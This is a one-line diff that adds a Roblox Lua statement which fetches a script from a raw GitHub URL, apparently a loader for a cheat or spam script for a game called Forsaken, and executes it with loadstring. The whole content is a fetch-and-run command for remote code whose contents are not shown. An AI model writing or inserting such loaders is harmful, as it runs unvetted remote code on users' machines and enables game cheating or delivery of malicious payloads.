@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/spectershapecabin/loaders/main/loaders/upd-forsaken-spam3-nk5lryn2f79skz.lua"))()
